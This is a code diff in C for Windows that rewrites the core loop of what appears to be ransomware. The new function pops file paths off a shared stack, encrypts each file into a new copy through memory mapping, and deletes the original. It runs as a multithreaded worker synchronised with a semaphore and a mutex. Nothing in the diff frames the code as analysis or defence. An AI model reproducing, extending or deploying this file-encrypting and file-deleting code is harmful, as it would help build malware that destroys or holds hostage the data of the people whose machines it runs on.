@@ -50,88 +50,19 @@ void encrypt_data(LPCVOID p_src, LPVOID p_dest, DWORD file_size) {
     }
 }
 
-void encrypt_stack(struct Stack *files_stack) {
-    while(!stack_is_empty(files_stack)) {
-        wchar_t *file, *output_file;
-        HANDLE h_file, h_map, h_dest_file, h_dest_map;
-        LPCVOID p_src;
-        LPVOID p_dest;
+DWORD WINAPI pop_and_encrypt(LPVOID param) {
+    struct Stack *stack = (struct Stack*)param;
+    while(true) {    
+        wait_sem();
+        lock_mutex();
+        wchar_t *file_path = (wchar_t*)stack_pop(stack);
+        unlock_mutex();
+        LPVOID p_src, p_dst;
         DWORD file_size;
-        
-        file = (wchar_t *)stack_pop(files_stack);
-        if((output_file = add_extension(file)) == NULL) {
-            free(file);
-            return;
-        }
-
-        h_file = CreateFileW(file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-        if(h_file == INVALID_HANDLE_VALUE) {
-            free(file);
-            return;
-        }
-
-        file_size = GetFileSize(h_file, NULL);
-        if(file_size == INVALID_FILE_SIZE) {
-            CloseHandle(h_file);
-            free(file);
-            return;
-        }
-
-        h_map = CreateFileMappingA(h_file,  NULL, PAGE_READONLY, 0, 0, NULL);
-        if(h_map == NULL) {
-            CloseHandle(h_file);
-            free(file);
-            return;
-        }
-
-        p_src = MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0);
-        if(p_src == NULL) {
-            CloseHandle(h_map);
-            CloseHandle(h_file);
-            free(file);
-            return;
-        }
-
-        h_dest_file = CreateFileW(output_file, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if(h_dest_file == INVALID_HANDLE_VALUE) {
-            CloseHandle(h_map);
-            CloseHandle(h_file);
-            free(file);
-            return;
-        }
-
-        h_dest_map = CreateFileMappingA(h_dest_file, NULL, PAGE_READWRITE, 0, file_size, NULL);
-        if(h_dest_map == NULL) {
-            CloseHandle(h_dest_file);
-            CloseHandle(h_map);
-            CloseHandle(h_file);
-            free(file);
-            return;
-        }
-
-        p_dest = MapViewOfFile(h_dest_map, FILE_MAP_WRITE, 0, 0, file_size);
-        if(p_dest == NULL) {
-            CloseHandle(h_dest_map);
-            CloseHandle(h_dest_file);
-            CloseHandle(h_map);
-            CloseHandle(h_file);
-            free(file);
-            return;
-        }
-
-        encrypt_data(p_src, p_dest, file_size);
-
-        UnmapViewOfFile(p_dest);
-        CloseHandle(h_dest_map);
-        CloseHandle(h_dest_file);
-
-        UnmapViewOfFile(p_src);
-        CloseHandle(h_map);
-        CloseHandle(h_file);
-        
-        DeleteFileW(file);
-
-        free(output_file);
-        free(file);
+        create_file_mappings(file_path, &file_size, &p_src, &p_dst);
+        encrypt_data(p_src, p_dst, file_size);
+        DeleteFileW(file_path);
+        free(file_path);
     }
+    return 0;
 }
